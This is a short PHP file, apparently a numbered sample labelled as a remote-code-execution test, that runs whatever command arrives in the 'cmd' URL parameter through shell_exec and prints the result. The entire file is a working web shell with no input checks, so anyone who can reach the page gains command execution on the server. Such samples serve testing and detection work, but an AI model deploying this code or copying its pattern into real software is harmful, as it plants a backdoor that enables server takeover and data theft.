<?php
// RCE test variation #848
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>